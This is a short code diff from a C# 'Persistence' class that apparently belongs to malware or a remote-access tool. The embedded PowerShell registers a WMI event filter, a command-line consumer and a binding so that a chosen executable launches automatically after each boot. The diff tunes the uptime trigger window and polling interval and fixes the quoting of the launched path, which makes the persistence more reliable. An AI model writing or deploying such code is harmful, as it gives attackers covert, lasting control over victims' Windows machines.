@@ -631,7 +631,7 @@ internal static partial class Persistence
             var script = $@"
 $ns = 'ROOT\subscription'
 $n  = '{name}'
-$q  = ""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320""
+$q  = ""SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime < 600""
 try {{
     $f = ([wmiclass]""$ns`:__EventFilter"").CreateInstance()
     $f.Name           = $n
@@ -641,7 +641,7 @@ try {{
     $f.Put() | Out-Null
     $c = ([wmiclass]""$ns`:CommandLineEventConsumer"").CreateInstance()
     $c.Name                = $n
-    $c.CommandLineTemplate = '{safePath}'
+    $c.CommandLineTemplate = '""{safePath}""'
     $c.Put() | Out-Null
     $b = ([wmiclass]""$ns`:__FilterToConsumerBinding"").CreateInstance()
     $b.Filter   = $f.__PATH
